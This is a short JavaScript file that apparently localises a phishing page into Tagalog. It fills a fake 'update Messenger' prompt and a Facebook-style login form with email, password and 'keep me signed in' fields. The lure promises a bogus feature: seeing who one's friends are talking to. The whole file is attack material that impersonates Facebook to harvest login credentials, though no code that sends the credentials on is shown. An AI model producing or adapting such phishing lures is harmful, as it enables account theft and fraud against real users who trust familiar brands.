var mainParagraph = document.querySelector(".con-text");
var subMainParagraph = document.querySelector(".log-text");
var updateButton = document.querySelector(".update")
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".login"); 
var checkBox = document.querySelector(".chbox"); 

mainParagraph.innerHTML ="I-update ang Messenger sa pinakabagong bersyon upang ma-enjoy gamit ang mga bagong feature tulad ng malaman kung sino ang nakikipag-usap sa iyong mga kaibigan";
subMainParagraph.innerHTML ="Agad na kumonekta sa mga tao sa iyong buhay. Mag-sign in gamit ang Facebook para makapagsimula.";
updateButton.innerHTML ="update ngayon";
userInput.setAttribute("placeholder" , "Email address o numero ng telepono");
passInput.setAttribute("placeholder" , "Password");
logButton.setAttribute("value" , "Mag log in");
checkBox.innerHTML ="Panatilihin akong naka-sign in";